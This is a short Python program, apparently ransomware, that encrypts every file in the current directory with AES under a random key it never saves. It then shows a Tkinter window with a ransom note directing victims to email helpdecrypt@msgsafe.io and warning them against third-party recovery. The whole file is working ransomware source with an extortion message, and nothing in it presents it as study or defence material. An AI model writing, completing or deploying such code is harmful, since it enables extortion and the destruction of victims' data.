import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import tkinter as tk

class FileEncryptor:
    def __init__(self, key):
        self.key = key

    def encrypt_file(self, input_file, output_file):
        cipher = AES.new(self.key, AES.MODE_CBC)
        try:
            with open(input_file, 'rb') as file_in:
                plaintext = file_in.read()
                ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

            with open(output_file, 'wb') as file_out:
                file_out.write(cipher.iv)
                file_out.write(ciphertext)

            print(f'Encryption successful. Encrypted file: {output_file}')
            return True

        except Exception as e:
            print(f'Error during encryption: {str(e)}')
            return False

def encrypt_all_files(key, directory='.', status_label=None):
    encryptor = FileEncryptor(key)

    # Ermittle alle Dateien im aktuellen Verzeichnis
    files_in_directory = [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]

    for file in files_in_directory:
        input_file = os.path.join(directory, file)
        encrypted_file = os.path.join(directory, 'encrypted_' + file)

        success = encryptor.encrypt_file(input_file, encrypted_file)

        if status_label is not None:
            if success:
                status_text = """YOUR FILES ARE ENCRYPTED
Don't worry, you can return all your files!
If you want to restore them, follow this link: email helpdecrypt@msgsafe.io YOUR ID -
If you have not been answered via the link within 12 hours, write to us by e-mail: helpdecrypt@msgsafe.io
Attention!
Do not rename encrypted files.
Do not try to decrypt your data using third party software, it may cause permanent data loss.
Decryption of your files with the help of third parties may cause increased price (they add their fee to ours) or you can become a victim of a scam."""
                status_label.config(text=status_text, font=('Helvetica', 14), wraplength=600)

def main():
    key = get_random_bytes(16)  # 128-bit key for AES

    # GUI
    root = tk.Tk()
    root.title("Encryption Status")

    status_label = tk.Label(root, text="", font=('Helvetica', 14), wraplength=600)
    status_label.pack()

    # Ermittle den aktuellen Pfad
    current_path = os.getcwd()
    print(f'Aktueller Pfad: {current_path}')

    # Verschlüssle alle Dateien im aktuellen Verzeichnis
    encrypt_all_files(key, current_path, status_label)

    root.mainloop()

if __name__ == '__main__':
    main()
